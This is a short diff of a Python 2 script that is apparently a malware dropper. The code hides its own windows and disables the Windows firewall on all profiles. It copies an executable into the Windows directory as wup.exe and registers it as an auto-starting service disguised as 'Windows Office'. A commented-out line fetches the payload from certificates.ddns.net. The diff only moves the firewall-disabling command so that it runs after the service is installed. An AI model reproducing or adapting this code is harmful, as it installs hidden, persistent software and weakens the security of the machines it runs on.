@@ -85,7 +85,7 @@ try:
     swin=os.getenv('windir')
     suser=os.getenv('USERPROFILE')
     if not os.path.exists('c:\\windows\\wup.exe'):
-        subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
+        
     ##    f = urllib2.urlopen("http://certificates.ddns.net/wofficeie.exe")
     ##    with open(swin+'\\wup.exe',"wb") as code:
     ##        code.write(f.read())
@@ -95,6 +95,7 @@ try:
         #subprocess.call("move "+swin+'\\wofficeie.exe '+swin+'\\wup.exe', creationflags=0x08000000)
         subprocess.call("cmd /c copy /y "+os.getcwd()+"\\wofficeie.exe " +swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
         subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=0x08000000)
+        subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
     subprocess.call("net start wup", creationflags=0x08000000)
     #myloop()
 except Exception,e:
